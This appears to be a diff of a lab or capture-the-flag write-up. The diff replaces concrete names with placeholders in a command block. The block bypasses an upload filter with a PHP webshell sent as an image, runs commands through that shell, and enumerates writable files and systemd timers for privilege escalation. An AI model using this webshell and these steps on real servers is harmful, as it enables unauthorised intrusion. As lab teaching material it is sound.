@@ -8,17 +8,17 @@
 
 ```bash
 # upload bypass attempts
-curl -F 'photo=@shell.phtml;type=image/png' http://<ip>/upload.php
-curl 'http://<ip>/uploads/shell.phtml?c=id'
+curl -F 'photo=@<shell.phtml>;type=image/png' http://<ip>/upload.php
+curl 'http://<ip>/uploads/<shell>.<ext>?<param>=id'
 
 # tiny webshell payload
-echo '<?php system($_GET["c"]); ?>' > shell.phtml
+echo '<?php system($_GET["<param>"]); ?>' > <shell>.<ext>
 
 # once you have a shell as www-data
 find / -group www-data -writable 2>/dev/null
 systemctl list-timers --all
-ls -l /opt/webapp/
-cat /etc/systemd/system/webapp-health.*
+find /opt /srv -writable 2>/dev/null
+cat /etc/systemd/system/*.service /etc/systemd/system/*.timer 2>/dev/null
 ```
 
 ## Concepts
